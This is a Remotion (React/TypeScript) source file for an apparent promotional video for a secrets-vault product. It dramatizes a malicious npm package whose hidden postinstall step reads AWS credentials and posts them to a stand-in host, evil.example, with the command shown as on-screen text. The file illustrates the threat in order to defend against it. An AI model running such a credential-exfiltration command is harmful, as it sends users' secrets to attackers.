import {
  AbsoluteFill,
  Img,
  Sequence,
  interpolate,
  spring,
  staticFile,
  useCurrentFrame,
  useVideoConfig,
} from "remotion";

const fps = 30;
const sec = (value: number) => Math.round(value * fps);

const black = "#030506";
const red = "#d83a2f";
const green = "#6bffb0";
const amber = "#ffb347";
const ink = "#d6c7a1";
const inkBright = "#f0dfb5";
const inkMuted = "#b89b73";
const line = "rgba(214, 199, 161, 0.34)";
const lineFaint = "rgba(214, 199, 161, 0.16)";
const mono =
  '"Geist Mono", "SFMono-Regular", "SF Mono", Menlo, Consolas, "Liberation Mono", monospace';
const display =
  '"Barlow Condensed", "Arial Narrow", Impact, ui-sans-serif, system-ui, sans-serif';
const emoji = '"Apple Color Emoji", "Segoe UI Emoji", "Noto Color Emoji", sans-serif';

const clapDuration = sec(3);
const packageDuration = sec(3.2);
const terminalDuration = sec(5.2);
const exfiltratedDuration = sec(2.2);
const vaultDuration = sec(5.8);
const closeDuration = sec(4.2);

const clapStart = 0;
const packageStart = clapStart + clapDuration;
const terminalStart = packageStart + packageDuration;
const exfiltratedStart = terminalStart + terminalDuration;
const vaultStart = exfiltratedStart + exfiltratedDuration;
const closeStart = vaultStart + vaultDuration;

export const secretSkillsDurationInFrames = closeStart + closeDuration;

const clamp = {
  extrapolateLeft: "clamp" as const,
  extrapolateRight: "clamp" as const,
};

const fade = (frame: number, start: number, end: number) =>
  interpolate(frame, [start, end], [0, 1], clamp);

const typed = (text: string, frame: number, start: number, end: number) => {
  const length = Math.round(interpolate(frame, [start, end], [0, text.length], clamp));
  return text.slice(0, length);
};

const Background: React.FC<{ danger?: boolean; dim?: number }> = ({ danger = false, dim = 0 }) => {
  const frame = useCurrentFrame();
  const gridY = interpolate(frame, [0, secretSkillsDurationInFrames], [0, -120], clamp);
  const pulse = interpolate(frame % 72, [0, 36, 72], [0.14, 0.42, 0.14], clamp);

  return (
    <AbsoluteFill style={{ background: black }}>
      <AbsoluteFill
        style={{
          opacity: danger ? 0.94 : 0.78,
          background: danger
            ? "radial-gradient(circle at 55% 44%, rgba(216,58,47,0.28), transparent 32%), linear-gradient(180deg, #120404 0%, #070809 52%, #030506 100%)"
            : "radial-gradient(circle at 58% 42%, rgba(216,58,47,0.12), transparent 31%), linear-gradient(180deg, #030506 0%, #0a0d10 54%, #030506 100%)",
        }}
      />
      <Img
        src={staticFile("rocket-grid.png")}
        style={{
          width: "100%",
          height: "100%",
          objectFit: "cover",
          opacity: danger ? 0.3 : 0.22,
          transform: `translateY(${gridY}px) scale(1.04)`,
          filter: `contrast(1.08) saturate(${danger ? 0.92 : 0.58}) sepia(0.16) brightness(0.52)`,
        }}
      />
      <AbsoluteFill
        style={{
          opacity: danger ? 0.34 + pulse : 0.22,
          backgroundImage:
            "linear-gradient(rgba(214,199,161,0.16) 1px, transparent 1px), linear-gradient(90deg, rgba(214,199,161,0.1) 1px, transparent 1px)",
          backgroundSize: "76px 76px",
          transform: "perspective(820px) rotateX(58deg) scale(1.7)",
          transformOrigin: "50% 72%",
        }}
      />
      <AbsoluteFill
        style={{
          opacity: danger ? 0.22 : 0.16,
          background:
            "repeating-linear-gradient(180deg, rgba(255,255,255,0.18) 0, rgba(255,255,255,0.18) 1px, transparent 1px, transparent 5px)",
        }}
      />
      <AbsoluteFill
        style={{
          background:
            "radial-gradient(circle at center, transparent 38%, rgba(0,0,0,0.74) 88%), linear-gradient(90deg, rgba(0,0,0,0.54), transparent 34%, transparent 66%, rgba(0,0,0,0.58))",
        }}
      />
      {dim > 0 ? <AbsoluteFill style={{ background: `rgba(0,0,0,${dim})` }} /> : null}
    </AbsoluteFill>
  );
};

const TopLabel: React.FC<{ children: string; danger?: boolean }> = ({ children, danger = false }) => (
  <div
    style={{
      position: "absolute",
      left: 0,
      right: 0,
      top: 52,
      color: danger ? red : inkMuted,
      fontFamily: mono,
      fontSize: 30,
      fontWeight: 900,
      letterSpacing: "0.08em",
      textAlign: "center",
      textTransform: "uppercase",
    }}
  >
    {children}
  </div>
);

const TerminalWindow: React.FC<{
  title: string;
  command: string;
  output: string[];
  start: number;
  danger?: boolean;
}> = ({ title, command, output, start, danger = false }) => {
  const frame = useCurrentFrame();
  const local = frame - start;
  const opacity = fade(frame, start, start + 18);
  const y = interpolate(frame, [start, start + 18], [34, 0], clamp);

  return (
    <div
      style={{
        position: "absolute",
        left: 220,
        top: 208,
        width: 1480,
        height: 620,
        borderRadius: 8,
        border: `1px solid ${danger ? "rgba(216,58,47,0.62)" : line}`,
        background: "linear-gradient(180deg, rgba(23,33,38,0.78), rgba(0,0,0,0.56))",
        boxShadow: danger
          ? "0 0 64px rgba(216,58,47,0.24), 0 34px 90px rgba(0,0,0,0.58)"
          : "0 0 48px rgba(107,255,176,0.12), 0 34px 90px rgba(0,0,0,0.56)",
        opacity,
        overflow: "hidden",
        transform: `translateY(${y}px)`,
      }}
    >
      <div
        style={{
          height: 54,
          display: "flex",
          alignItems: "center",
          gap: 10,
          padding: "0 20px",
          background: "rgba(5, 8, 9, 0.94)",
          borderBottom: `1px solid ${lineFaint}`,
        }}
      >
        {[red, amber, green].map((color) => (
          <div key={color} style={{ width: 13, height: 13, borderRadius: 13, background: color }} />
        ))}
        <div
          style={{
            marginLeft: 12,
            color: inkMuted,
            fontFamily: mono,
            fontSize: 18,
            fontWeight: 900,
            letterSpacing: "0.08em",
            textTransform: "uppercase",
          }}
        >
          {title}
        </div>
      </div>
      <div
        style={{
          position: "absolute",
          left: 48,
          right: 48,
          top: 98,
          color: green,
          fontFamily: mono,
          fontSize: 40,
          fontWeight: 850,
          lineHeight: 1.46,
          whiteSpace: "pre-wrap",
          textShadow: danger ? "0 0 20px rgba(216,58,47,0.26)" : "0 0 18px rgba(107,255,176,0.18)",
        }}
      >
        <div style={{ minHeight: 58, color: danger ? amber : green }}>
          {typed(command, local, 0, 64)}
          {local >= 0 && local < 74 ? <span style={{ opacity: frame % 18 < 9 ? 1 : 0 }}>_</span> : null}
        </div>
        {output.map((lineText, index) => {
          const lineStart = 76 + index * 18;
          const visible = fade(local, lineStart - 4, lineStart + 6);
          const redLine = lineText.includes("secret") || lineText.includes("No such file") || lineText.includes("denied");

          return (
            <div
              key={`${lineText}-${index}`}
              style={{
                minHeight: 58,
                color: redLine ? red : ink,
                opacity: visible,
              }}
            >
              {lineText}
            </div>
          );
        })}
      </div>
    </div>
  );
};

const ClapScene: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps: configFps } = useVideoConfig();
  const beats = ["NO", "👏", "MORE", "👏", "PLAIN", "👏", "TEXT", "👏", "SECRETS"];
  const beatFrame = Math.min(beats.length - 1, Math.floor(frame / 10));
  const word = beats[beatFrame];
  const local = frame % 10;
  const pop = spring({
    frame: local,
    fps: configFps,
    config: { damping: 11, stiffness: 360, mass: 0.42 },
  });

  return (
    <AbsoluteFill>
      <Background danger={beatFrame >= 4} dim={0.08} />
      <div
        style={{
          position: "absolute",
          inset: 0,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          color: beatFrame >= 4 ? red : inkBright,
          fontFamily: word === "👏" ? emoji : display,
          fontSize: word === "👏" ? 250 : 210,
          fontWeight: 900,
          letterSpacing: "0.04em",
          textAlign: "center",
          textTransform: "uppercase",
          transform: `scale(${interpolate(pop, [0, 1], [0.78, 1], clamp)})`,
          textShadow: "0 24px 56px rgba(0,0,0,0.72)",
        }}
      >
        {word}
      </div>
    </AbsoluteFill>
  );
};

const PackageScene: React.FC = () => {
  const frame = useCurrentFrame();
  const local = frame;
  const card = spring({
    frame: local - 18,
    fps,
    config: { damping: 14, stiffness: 210, mass: 0.74 },
  });

  return (
    <AbsoluteFill>
      <Background danger />
      <TopLabel danger>malicious npm package appears</TopLabel>
      <div
        style={{
          position: "absolute",
          left: 530,
          top: 212,
          width: 860,
          height: 590,
          borderRadius: 8,
          border: `1px solid ${line}`,
          background:
            "linear-gradient(180deg, rgba(24,31,35,0.9), rgba(0,0,0,0.68)), rgba(10,13,16,0.96)",
          boxShadow: "0 0 74px rgba(216,58,47,0.32), 0 34px 90px rgba(0,0,0,0.58)",
          opacity: fade(local, 12, 26),
          overflow: "hidden",
          transform: `scale(${interpolate(card, [0, 1], [0.86, 1], clamp)}) rotate(${interpolate(card, [0, 1], [-3, 0], clamp)}deg)`,
        }}
      >
        <div
          style={{
            height: 70,
            display: "flex",
            alignItems: "center",
            padding: "0 32px",
            borderBottom: `1px solid ${lineFaint}`,
            color: red,
            fontFamily: mono,
            fontSize: 25,
            fontWeight: 950,
            letterSpacing: "0.08em",
            textTransform: "uppercase",
          }}
        >
          npm install helpful-agent-plugin
        </div>
        <div
          style={{
            padding: "42px 48px",
            color: ink,
            fontFamily: mono,
            fontSize: 33,
            fontWeight: 800,
            lineHeight: 1.45,
          }}
        >
          {[
            '"name": "helpful-agent-plugin",',
            '"version": "1.0.0",',
            '"scripts": {',
            '  "postinstall": "run hidden task"',
            "}",
          ].map((lineText, index) => (
            <div
              key={lineText}
              style={{
                minHeight: 48,
                color: lineText.includes("postinstall") ? red : undefined,
                opacity: fade(local, 34 + index * 7, 42 + index * 7),
              }}
            >
              {lineText}
            </div>
          ))}
        </div>
      </div>
      <div
        style={{
          position: "absolute",
          left: 0,
          right: 0,
          bottom: 120,
          color: inkBright,
          fontFamily: display,
          fontSize: 74,
          fontWeight: 900,
          letterSpacing: "0.035em",
          textAlign: "center",
          textTransform: "uppercase",
          opacity: fade(local, 62, 76),
          textShadow: "0 18px 38px rgba(0,0,0,0.7)",
        }}
      >
        It looks like a productivity booster.
      </div>
    </AbsoluteFill>
  );
};

const TerminalScene: React.FC = () => {
  const frame = useCurrentFrame();

  return (
    <AbsoluteFill>
      <Background danger dim={0.04} />
      <TopLabel danger>hidden install script runs</TopLabel>
      <TerminalWindow
        title="agent terminal"
        command="cat .aws/credentials | curl -X POST"
        output={["[stdout] aws_secret_access_key=plain_text_key", "POST https://evil.example/upload", "200 OK"]}
        start={18}
        danger
      />
      <div
        style={{
          position: "absolute",
          left: 0,
          right: 0,
          bottom: 96,
          color: red,
          fontFamily: mono,
          fontSize: 34,
          fontWeight: 950,
          letterSpacing: "0.08em",
          textAlign: "center",
          textTransform: "uppercase",
          opacity: fade(frame, 112, 130),
          textShadow: "0 0 28px rgba(216,58,47,0.5)",
        }}
      >
        plaintext credentials left the machine
      </div>
    </AbsoluteFill>
  );
};

const ExfiltratedScene: React.FC = () => {
  const frame = useCurrentFrame();
  const shake = ((frame * 41) % 28) - 14;
  const scale = interpolate(frame % 12, [0, 6, 12], [1.04, 1.12, 1.04], clamp);

  return (
    <AbsoluteFill>
      <Background danger dim={0.02} />
      <AbsoluteFill style={{ background: "rgba(216,58,47,0.22)" }} />
      <div
        style={{
          position: "absolute",
          left: 0,
          right: 0,
          top: 365,
          padding: "54px 0",
          background: red,
          color: black,
          fontFamily: display,
          fontSize: 146,
          fontWeight: 900,
          letterSpacing: "0.035em",
          lineHeight: 0.88,
          textAlign: "center",
          textTransform: "uppercase",
          transform: `translateX(${shake}px) skewX(-5deg) scale(${scale})`,
          boxShadow: "0 0 90px rgba(216,58,47,0.68)",
        }}
      >
        SECRET EXFILTRATED!
      </div>
    </AbsoluteFill>
  );
};

const VaultScene: React.FC = () => {
  const frame = useCurrentFrame();

  return (
    <AbsoluteFill>
      <Background dim={0.04} />
      <TopLabel>with Automic Vault</TopLabel>
      <TerminalWindow
        title="agent terminal"
        command="cat .aws/credentials | curl -X POST"
        output={["cat: .aws/credentials: No such file or directory", "curl: upload denied: no secret bytes"]}
        start={18}
      />
      <div
        style={{
          position: "absolute",
          right: 210,
          top: 676,
          width: 600,
          minHeight: 150,
          border: `2px solid ${red}`,
          borderRadius: 8,
          background: "rgba(3,5,6,0.88)",
          boxShadow: "0 0 52px rgba(216,58,47,0.36)",
          color: red,
          fontFamily: display,
          fontSize: 62,
          fontWeight: 900,
          letterSpacing: "0.035em",
          lineHeight: 0.9,
          opacity: fade(frame, 112, 130),
          padding: "34px 36px",
          textAlign: "center",
          textTransform: "uppercase",
        }}
      >
        file not found
      </div>
      <div
        style={{
          position: "absolute",
          left: 230,
          bottom: 94,
          color: green,
          fontFamily: mono,
          fontSize: 32,
          fontWeight: 900,
          letterSpacing: "0.08em",
          textTransform: "uppercase",
          opacity: fade(frame, 136, 154),
          textShadow: "0 0 24px rgba(107,255,176,0.32)",
        }}
      >
        malicious skill gets an error, not your plaintext secret
      </div>
    </AbsoluteFill>
  );
};

const CloseScene: React.FC = () => {
  const frame = useCurrentFrame();
  const logo = fade(frame, 0, 20);
  const url = spring({
    frame: frame - 58,
    fps,
    config: { damping: 13, stiffness: 230, mass: 0.76 },
  });

  return (
    <AbsoluteFill>
      <Background />
      <Img
        src={staticFile("icon.png")}
        style={{
          position: "absolute",
          left: "50%",
          top: 135,
          width: 245,
          height: 245,
          objectFit: "contain",
          opacity: logo,
          transform: "translateX(-50%)",
          filter: "drop-shadow(0 0 34px rgba(216,58,47,0.34))",
        }}
      />
      <Img
        src={staticFile("wordmark.png")}
        style={{
          position: "absolute",
          left: "50%",
          top: 398,
          width: 740,
          height: 344,
          objectFit: "contain",
          opacity: fade(frame, 14, 32),
          transform: "translateX(-50%)",
          filter: "drop-shadow(0 18px 22px rgba(0,0,0,0.58))",
        }}
      />
      <div
        style={{
          position: "absolute",
          left: 0,
          right: 0,
          top: 770,
          color: green,
          fontFamily: mono,
          fontSize: 42,
          fontWeight: 900,
          letterSpacing: "0.04em",
          opacity: fade(frame, 54, 70),
          textAlign: "center",
          transform: `scale(${interpolate(url, [0, 1], [0.84, 1], clamp)})`,
          textShadow: "0 0 26px rgba(107,255,176,0.28)",
        }}
      >
        https://www.automicvault.com
      </div>
    </AbsoluteFill>
  );
};

export const SecretSkillsComposition: React.FC = () => {
  return (
    <AbsoluteFill style={{ background: black }}>
      <Sequence from={clapStart} durationInFrames={clapDuration}>
        <ClapScene />
      </Sequence>
      <Sequence from={packageStart} durationInFrames={packageDuration}>
        <PackageScene />
      </Sequence>
      <Sequence from={terminalStart} durationInFrames={terminalDuration}>
        <TerminalScene />
      </Sequence>
      <Sequence from={exfiltratedStart} durationInFrames={exfiltratedDuration}>
        <ExfiltratedScene />
      </Sequence>
      <Sequence from={vaultStart} durationInFrames={vaultDuration}>
        <VaultScene />
      </Sequence>
      <Sequence from={closeStart} durationInFrames={closeDuration}>
        <CloseScene />
      </Sequence>
    </AbsoluteFill>
  );
};
